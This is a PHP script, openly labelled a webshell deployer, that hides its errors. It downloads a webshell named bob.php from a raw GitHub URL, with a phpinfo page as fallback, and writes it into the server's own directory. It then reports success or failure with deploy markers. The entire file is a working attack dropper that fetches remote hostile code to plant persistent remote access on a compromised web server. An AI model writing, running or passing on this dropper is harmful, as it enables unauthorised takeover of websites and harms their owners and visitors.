<?php
@error_reporting(0);
@set_time_limit(0);

// Bob Marley Webshell Deployer with Fallback
// Try Bob Marley webshell first, fallback to phpinfo if it fails

$urls = [
    'https://raw.githubusercontent.com/Bob-Marley-Backup/LAB-Uncomplete/refs/heads/main/bob.php',
    'https://raw.githubusercontent.com/Bob-Marley-Backup/LAB-Uncomplete/refs/heads/main/phpinfo.php'
];

$target = __DIR__ . '/bob.php';
$success = false;

foreach($urls as $idx => $url) {
    $content = @file_get_contents($url);
    
    // Validate content (must be at least 1000 bytes)
    if($content && strlen($content) > 1000) {
        if(@file_put_contents($target, $content)) {
            if($idx === 0) {
                echo '[DEPLOY_SUCCESS] Bob Marley shell deployed';
            } else {
                echo '[DEPLOY_SUCCESS] Fallback phpinfo shell deployed';
            }
            $success = true;
            break;
        }
    }
}

if(!$success) {
    echo '[DEPLOY_FAILED] Cannot download or write webshell';
}
?>
